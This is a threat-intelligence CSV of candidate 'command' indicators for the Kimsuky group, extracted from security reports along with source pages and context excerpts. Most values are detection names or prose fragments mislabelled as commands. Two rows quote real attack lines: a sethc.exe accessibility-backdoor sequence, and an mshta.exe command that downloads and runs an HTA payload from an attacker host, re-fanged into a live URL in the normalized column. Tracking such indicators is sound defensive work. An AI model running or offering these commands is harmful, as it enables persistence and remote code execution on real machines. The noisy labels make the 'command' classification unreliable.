schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--kimsuky,artifact--sha256:c6b088ce9d0b4e2b51b072cacc16d9b4163e2eec4ae149d5aaf9c77369abc6e4,observation--sha256:e102c01da9a1f4a6982dcf7fd3c466a895d32ec72ed5638e162affefd9600166,command,CommandandScriptingInterpreter:PowerShell,CommandandScriptingInterpreter:PowerShell,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 64}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport 7. 공격지표(Indicator of Attack)7.1. MITREATT&CKMatrix Tactic Technique Description Reconnaissance T1598.002 Phishingfor Information: SpearphishingAttachmentT1598.003 Phishingfor Information: SpearphishingLinkResourceDevelopment T1585.002 EstablishAccounts: Email AccountsT1585.003 EstablishAccounts: CloudAccounts Initial Access T1566.002 Phishing: SpearphishingLinkT1566.003 Phishing: SpearphishingviaService Execution T1059.001 CommandandScriptingInterpreter:PowerShell T1059,
1.0.0,actor--kimsuky,artifact--sha256:1ec149d76c47b8e4846529f3ff6a31545cab5e7f91c32d35fa8cda5cbe05dcbd,observation--sha256:eac2d51822cc5cd0dd89b755f7e5b75f8b4289ec10c7648bfb48ade26997f5cb,command,Downloader/Powershell.Kimsuky.SC188250 (2023.05.08.02),Downloader/Powershell.Kimsuky.SC188250 (2023.05.08.02,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e57c648ea91e0c5b08b07de7a5797842d49fddba44fdc336e99a0a1844447429,observation--sha256:72658650890a0062dde07c6ab74e7fd0f47ba85b52a9252d4da43f0ad9b0ec3a,command,"Ex) ""cmd.exe /c takeown /f \""sethc.exe\""&icacls \""sethc.exe\"" /grant SYSTEM:f&ren sethc.exe","Ex) ""cmd.exe /c takeown /f \""sethc.exe\""&icacls \""sethc.exe\"" /grant SYSTEM:f&ren sethc.exe",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c2f3b0735d873845cbe165ef74994a42b02a0ab8936608b460a003a23aeeebcc,observation--sha256:ce66410109da5efe1a2fafd7c52db60b5217c5d3cb0631e692dfa48933f51a3d,command,"Ex) ""mshta.exe hxxps://floridas.000webhostapp.com/set.hta","Ex) ""mshta.exe https://floridas.000webhostapp.com/set.hta",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3a8e9cfecfb97cdcfd3cb81b7991f39b8355e570dc40d6e04939c197198c6ce9,observation--sha256:fe33b9d839814c1fdee190a845403ff66755c3045f9bb7fb1781ae3d1c994af8,command,"File, required when malicious Powershell scripts run","File, required when malicious Powershell scripts run",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"[+] (Ministry of Unification) North Korea Information Portal: ua.zip hxxps://nkinfo.unikorea.go.kr/nkp/term/skNkItTerm.do?pageIndex=32 (Table 15) At the time of recognizing the purpose of the Cook folder, namastte, only show.php existed, so it was difficult to determine the exact upload method or its relationship with other files, but it was confirmed in the analysis of other cases. Malware that uses show.php is shown below (Figure 26). I found a North Korean expression in the comments of index.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2b2fbf5c2aa9645ec133864097608482fb36d63e6194eb5fcadfc2c9add9379e,observation--sha256:98b166f66c8ffd0af66dc8c1e12d64ffed70960f2ebe8416ed28e74fab8b22f9,command,"In particular, the above figure shows that the function styles used by PowerShell as well as the file names","In particular, the above figure shows that the function styles used by PowerShell as well as the file names",candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 12}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"[Figure 6] Comparison of malicious scripts found home and abroad In particular, the above figure shows that the function styles used by PowerShell as well as the file names ('expres.php?op=1', 'cow.php?op=1"") and parameters used to communicate with the C2 server are very similar in both scripts.",
1.0.0,actor--kimsuky,artifact--sha256:464339ccced7d527ad862885f96495b09c9dde08cecd98322d3bf1f63272c488,observation--sha256:8a2fdbd6f4cd45857d08dc9802535bd3310f8bc4b11f0c84d51a03dfbda1d6c9,command,Infostealer/Powershell.Browser.SC186288,Infostealer/Powershell.Browser.SC186288,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:464339ccced7d527ad862885f96495b09c9dde08cecd98322d3bf1f63272c488,observation--sha256:274676273f8662ed5bce8877028954536bee438520c358fb0da32588a3833d0b,command,Infostealer/Powershell.Browser.SC186288,Infostealer/Powershell.Browser.SC186288,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1cf19b3b1708c092be3f3d01ccfb9f234887a1ef92fdc9c53a4293d0952a14e4,observation--sha256:26f7138358df17c611b27528dc4863e9864138f3fa7447e46d8759e5d9f084bd,command,Keylogger/PowerShell.Agent.SC188884 (2023.05.24.00),Keylogger/PowerShell.Agent.SC188884 (2023.05.24.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:cd88ad4ea33e2136a1977025d3612dff5884257ec3e2e2bab8282f3c96f5a066,observation--sha256:61259116a9567dfa2d242ea21a672b5a39ed7cd764c58e8c6e7eb33e409a0bc0,command,Keylogger/Powershell.Agent,Keylogger/Powershell.Agent,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0c5c20b747aad28d6bb9376c69aa573128a49765c2c37cd1e986d857640982f0,observation--sha256:d3987235cf77abc57b316abbafc3ef4c729d6f0dc2a6faed7e7061b154875bd4,command,"Macros inserted into files and documents, Powershell scripts provided as Windows functions, and Windows system commands","Macros inserted into files and documents, Powershell scripts provided as Windows functions, and Windows system commands",candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 81}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"domain_x64.dll hxxps://www.bleepingcomputer.com/news/security/microsoft-to-kill-off-vbscript-in-windows-to-block- Macros inserted into files and documents, Powershell scripts provided as Windows functions, and Windows system commands Diagnostic Time File Name 2023-02-24 Removing VBS will not have a significant impact on hacking organizations. The reason is that even if the hacking organization is not VBS, hxxps://learn.microsoft.com/en-us/windows/whats-new/deprecated-features The malicious code ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:99d5174072e0d9f820ede63e5458abfb23d59061640238c435a325f565b9a0a7,observation--sha256:e9a9f1126d76cd6d61e60af7df42a9cbb8699b03f2573929f9be7a35f7f67008,command,"Phishing disguised as normal URL frequently used by the target, Hangul, MS Office document files, executable files, scripts, Powershell,","Phishing disguised as normal URL frequently used by the target, Hangul, MS Office document files, executable files, scripts, Powershell",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 1) Hacking email sent to North Korea support staff Operation Covert Stalker Report The Kimsuky organization, which is backed by the state, hacks various fields such as North Korea, politics, diplomacy, security, national defense, medicine, and finance to steal email accounts or important data from specific people or organizations, mainly using an effective means such as email. hacking On Friday, April 29, 2022, around the time of work, AhnLab disclosed analysis information titled ""Distri",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b1ea0e3564772aeac207b88ddf0a5044747b6b8cc2713a3cd10cb594a3eb2a91,observation--sha256:c930357171daa9f512d415aa58d303ca9fbbfa55b15f3f6a7ee0323829304b3b,command,PowerShell commands in the earlier and open source versions. Rapid7 notes,PowerShell commands in the earlier and open source versions. Rapid7 notes,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 Figure 5 - Most recent Kimsuky LNK format Rapid7 tracked this toolmark to a now removed post by @x86matthew sharing a POC named EmbedExeLnk. This post was shared in 2022, several months before the first Kimsuky variant and it’s easy to see similarities like -bxor 0x77 and other PowerShell commands in the earlier and open source versions. Rapid7 notes attribution on this toolmark alone is not satisfactory for attribution as there are several other examples of LNK building tools based on @x86mat",Actor-directory corpus sweep; ambiguous values remain candidates.
